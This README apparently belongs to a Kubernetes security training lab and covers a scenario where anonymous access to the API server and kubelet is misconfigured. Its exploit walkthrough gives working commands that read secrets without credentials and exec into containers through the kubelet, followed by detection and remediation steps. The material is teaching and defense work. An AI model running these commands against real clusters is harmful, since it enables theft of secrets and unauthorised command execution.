# Scenario 07 — Anonymous API Access & Insecure Kubelet

| | |
|---|---|
| **Vuln class** | Authentication / exposed control plane |
| **Difficulty** | ⭐⭐⭐ Medium–Hard |
| **Backends** | kind ✅ (API half)  AKS ✅ |
| **Namespace** | `anon-api` (+ cluster-scoped RBAC) |
| **MITRE ATT&CK for Containers** | [T1610 Deploy Container](https://attack.mitre.org/techniques/T1610/), [TA0007 Discovery](https://attack.mitre.org/tactics/TA0007/) |

## What it is
The built-in groups `system:unauthenticated` / `system:anonymous` are bound to a
ClusterRole that can read pods, nodes, and **secrets**. Any request with *no
credentials at all* can enumerate and loot the cluster. The README also covers
the sister defect: an **insecure kubelet** (anonymous auth / read-only port).

## Why it matters
Authentication is the front door. If `system:anonymous` has real permissions, the
API server hands cluster data to anyone who can reach it — no token needed. Pair
this with an internet-exposed API (never do that) and it's game over. The kubelet
equivalent (`--anonymous-auth=true`, read-only port 10255) leaks pod specs and
allows command execution on nodes.

## Deploy just this scenario
```powershell
kubectl apply -f scenarios/07-anonymous-api-kubelet/manifest.yaml
```

## Exploit walkthrough — anonymous API
```powershell
# From INSIDE the cluster network, no token, no client cert:
$pod = kubectl -n anon-api get pod -A -l lab=k8s-sec-lab -o jsonpath='{.items[0].metadata.name}' 2>$null
# Easiest: from any pod, hit the API anonymously.
kubectl run anon-probe -n anon-api --image=alpine:3.20 --restart=Never -- sleep infinity
kubectl -n anon-api exec -it anon-probe -- sh
```
Inside the probe pod, strip your token to prove it's truly anonymous:
```bash
apk add --no-cache curl >/dev/null 2>&1
API=https://kubernetes.default.svc
# No Authorization header at all:
curl -sk $API/api/v1/namespaces/kube-system/secrets | head
curl -sk $API/api/v1/nodes | grep -o '"name":"[^"]*"' | head
```
You should get data back instead of `401/403`.

Confirm from your workstation too:
```powershell
kubectl auth can-i list secrets --as=system:anonymous -A      # -> yes (vulnerable)
```

## Exploit walkthrough — insecure kubelet (real clusters / AKS)
> kind runs the kubelet with webhook auth by default, so this half is documented
> rather than pre-broken. On a cluster where the kubelet allows anonymous access:
```bash
# Enumerate pods the kubelet is running (port 10250, TLS, anon):
kubeletctl -i --server <NODE_IP> pods
# Execute in a running container via the kubelet, bypassing the API server/RBAC:
kubeletctl -i --server <NODE_IP> exec "id" -p <pod> -c <container> -n <ns>
# Read-only port (if 10255 open): no auth at all
curl -s http://<NODE_IP>:10255/pods | jq '.items[].metadata.name'
```

## What success looks like
- `kubectl auth can-i list secrets --as=system:anonymous` returns **yes**.
- Anonymous `curl` to the API returns node/secret data instead of `401`.

## Detection
- **Audit log**: requests with `user: system:anonymous` that succeed are a red
  flag — alert on any `2xx` for that user.
- **Falco**: *"Contact K8S API Server From Container"*, *"Anonymous Request
  Allowed"* (custom rule).
- **kube-bench**: CIS checks for `--anonymous-auth=false` on apiserver/kubelet and
  disabling the read-only port.

## Remediation
- Never bind roles to `system:anonymous` / `system:unauthenticated`. Delete the
  binding: `kubectl delete clusterrolebinding anonymous-snoop-binding`.
- API server: `--anonymous-auth=false`.
- Kubelet: `--anonymous-auth=false`, `--authorization-mode=Webhook`,
  `--read-only-port=0`.
- Restrict network reachability of the API/kubelet to trusted CIDRs (this lab's
  AKS backend locks the API to your IP).

## Suggested order
Sixth. Do after you understand RBAC (01) and tokens (04).
